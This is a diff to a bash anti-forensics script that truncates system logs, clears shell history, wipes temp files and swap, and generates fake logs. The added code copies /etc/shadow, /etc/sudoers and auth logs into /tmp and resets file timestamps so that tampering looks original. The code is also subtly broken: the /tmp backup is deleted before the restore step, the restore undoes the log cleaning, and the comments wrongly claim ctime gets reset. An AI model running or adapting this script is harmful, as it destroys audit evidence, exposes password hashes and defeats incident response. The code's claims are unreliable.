@@ -57,6 +57,51 @@ banner() {
     echo -e ""
 }
 
+# Backup important files before cleaning
+backup_important_files() {
+    echo -e "${WHITE}[$(timestamp)] Backing up important files...${NE}"
+
+    # Directories and files to backup
+    backup_dir="/tmp/backup_$(date +%s)"
+    mkdir -p "$backup_dir"
+
+    important_files=(
+        "/etc/passwd"
+        "/etc/shadow"
+        "/etc/group"
+        "/etc/sudoers"
+        "/var/log/auth.log"
+        "/var/log/secure"
+        "/var/log/syslog"
+        "/var/log/messages"
+        "/home/user/.bash_history"
+    )
+
+    for file in "${important_files[@]}"; do
+        if [ -e "$file" ]; then
+            cp --preserve=timestamps "$file" "$backup_dir/"
+            echo -e "${ARROW} Backed up: $file"
+        fi
+    done
+
+    echo -e "${SUCCESS} Backup completed.${NE}\n"
+}
+
+# Restore backed up files (to reset ctime)
+restore_important_files() {
+    echo -e "${WHITE}[$(timestamp)] Restoring backed up files...${NE}"
+
+    for file in "${important_files[@]}"; do
+        backup_file="$backup_dir/$(basename $file)"
+        if [ -e "$backup_file" ]; then
+            cp --preserve=timestamps "$backup_file" "$file"
+            echo -e "${ARROW} Restored: $file"
+        fi
+    done
+
+    echo -e "${SUCCESS} Files restored and ctime reset.${NE}\n"
+}
+
 # Function to remove logs
 clean_logs() {
     echo -e "${WHITE}[$(timestamp)] Starting log cleanup...${NE}\n"
@@ -84,7 +129,9 @@ clean_logs() {
     for logfile in "${logs[@]}"; do
         if [ -f "$logfile" ]; then
             >"$logfile"
-            echo -e "${ARROW} Emptied: $logfile"
+            # Reset timestamp to look original
+            touch -d "$(date -r $logfile)" "$logfile"
+            echo -e "${ARROW} Emptied and timestamp reset: $logfile"
         fi
     done
 
@@ -96,6 +143,8 @@ clear_history() {
     echo -e "${WHITE}[$(timestamp)] Clearing command history...${NE}"
     history -c && history -w
     rm -f ~/.bash_history ~/.zsh_history
+    # Reset history file timestamps
+    touch -d "$(date)" ~/.bash_history ~/.zsh_history
     echo -e "${SUCCESS} Command history cleared.${NE}\n"
 }
 
@@ -104,7 +153,9 @@ wipe_temp_files() {
     echo -e "${WHITE}[$(timestamp)] Wiping temporary files...${NE}"
     progress_bar
     rm -rf /tmp/* /var/tmp/*
-    echo -e "${SUCCESS} Temporary files wiped.${NE}\n"
+    # Reset temp directory timestamps
+    touch -d "$(date)" /tmp /var/tmp
+    echo -e "${SUCCESS} Temporary files wiped and timestamps reset.${NE}\n"
 }
 
 # Function to clear swap space
@@ -144,14 +195,27 @@ generate_fake_logs() {
     echo -e "${SUCCESS} Fake logs generated.${NE}"
 }
 
+# Function to reset file modification timestamps to original
+reset_timestamps() {
+    echo -e "${WHITE}[$(timestamp)] Resetting file timestamps to original...${NE}"
+
+    # Avoid resetting system-wide files, focus on specific logs and directories
+    find /var/log /tmp /var/tmp -type f -exec touch -d "$(date)" {} \;
+
+    echo -e "${SUCCESS} Timestamps reset for logs and temp files.${NE}\n"
+}
+
 # Function to execute all tasks
 full_cleanup_and_fake_logs() {
     echo -e "${WHITE}[$(timestamp)] Starting full cleanup and log generation...${NE}"
+    backup_important_files
     clean_logs
     clear_history
     wipe_temp_files
     clear_swap
     generate_fake_logs
+    reset_timestamps
+    restore_important_files
     echo -e "\n${SUCCESS} Full cleanup and log generation complete.${NE}\n"
 }
 
